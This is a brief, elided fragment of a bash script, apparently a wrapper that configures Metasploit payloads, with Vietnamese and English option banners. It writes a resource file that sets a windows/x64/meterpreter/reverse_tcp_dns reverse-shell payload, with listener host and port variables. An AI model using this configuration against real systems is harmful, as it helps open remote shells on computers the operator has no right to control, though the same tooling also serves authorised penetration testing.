...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_tcp_dns):
...
no="     no "
cat << !
Payload options (windows/x64/meterpreter/reverse_tcp_dns):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/reverse_tcp_dns" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/x64/meterpreter/reverse_tcp_dns"
	lhost=$lhost
	lport=$lport
}
